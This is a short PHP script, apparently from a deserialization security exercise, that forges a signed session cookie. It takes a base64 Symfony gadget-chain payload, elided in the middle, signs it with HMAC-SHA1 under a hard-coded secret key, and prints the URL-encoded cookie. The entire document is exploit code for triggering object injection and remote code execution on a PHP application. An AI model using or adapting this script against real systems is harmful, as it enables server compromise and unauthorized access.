<?php
$gadget_chain_payload = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6
...
O319Cg==";
$key = "0c5bmjvch0gbqsvmzlc9hp99p2xp46ov";
$cookie = urlencode('{"token":"' . $gadget_chain_payload . '","sig_hmac_sha1":"' . hash_hmac('sha1', $gadget_chain_payload, $key) . '"}');
echo $cookie;